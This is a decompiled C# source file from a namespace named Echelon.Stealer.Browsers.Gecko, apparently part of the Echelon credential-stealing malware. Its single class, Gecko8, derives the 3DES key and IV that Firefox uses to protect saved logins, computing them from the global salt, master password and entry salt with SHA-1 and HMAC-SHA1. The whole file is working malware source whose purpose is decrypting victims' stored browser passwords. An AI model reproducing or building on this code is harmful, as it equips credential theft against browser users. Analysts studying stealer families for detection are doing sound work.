using System;
using System.Security.Cryptography;

namespace Echelon.Stealer.Browsers.Gecko
{
	// Token: 0x02000047 RID: 71
	public class Gecko8
	{
		// Token: 0x060001CB RID: 459 RVA: 0x000098F4 File Offset: 0x00007AF4
		public Gecko8(byte[] salt, byte[] password, byte[] entry)
		{
			this._globalSalt = salt;
			this._masterPassword = password;
			this._entrySalt = entry;
		}

		// Token: 0x17000030 RID: 48
		// (get) Token: 0x060001CC RID: 460 RVA: 0x00009911 File Offset: 0x00007B11
		private byte[] _globalSalt { get; }

		// Token: 0x17000031 RID: 49
		// (get) Token: 0x060001CD RID: 461 RVA: 0x00009919 File Offset: 0x00007B19
		private byte[] _masterPassword { get; }

		// Token: 0x17000032 RID: 50
		// (get) Token: 0x060001CE RID: 462 RVA: 0x00009921 File Offset: 0x00007B21
		private byte[] _entrySalt { get; }

		// Token: 0x17000033 RID: 51
		// (get) Token: 0x060001CF RID: 463 RVA: 0x00009929 File Offset: 0x00007B29
		// (set) Token: 0x060001D0 RID: 464 RVA: 0x00009931 File Offset: 0x00007B31
		public byte[] DataKey { get; private set; }

		// Token: 0x17000034 RID: 52
		// (get) Token: 0x060001D1 RID: 465 RVA: 0x0000993A File Offset: 0x00007B3A
		// (set) Token: 0x060001D2 RID: 466 RVA: 0x00009942 File Offset: 0x00007B42
		public byte[] DataIV { get; private set; }

		// Token: 0x060001D3 RID: 467 RVA: 0x00020A78 File Offset: 0x0001EC78
		public void method_0()
		{
			SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this._globalSalt.Length + this._masterPassword.Length];
			Array.Copy(this._globalSalt, 0, array, 0, this._globalSalt.Length);
			Array.Copy(this._masterPassword, 0, array, this._globalSalt.Length, this._masterPassword.Length);
			byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this._entrySalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(this._entrySalt, 0, array3, array2.Length, this._entrySalt.Length);
			byte[] key = sha1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this._entrySalt, 0, array4, 0, this._entrySalt.Length);
			for (int i = this._entrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this._entrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this._entrySalt, 0, array5, array4.Length, this._entrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this._entrySalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(this._entrySalt, 0, array8, array7.Length, this._entrySalt.Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.DataKey = new byte[24];
			for (int j = 0; j < this.DataKey.Length; j++)
			{
				this.DataKey[j] = array10[j];
			}
			this.DataIV = new byte[8];
			int num = this.DataIV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.DataIV.Length; k--)
			{
				this.DataIV[num] = array10[k];
				num--;
			}
		}
	}
}
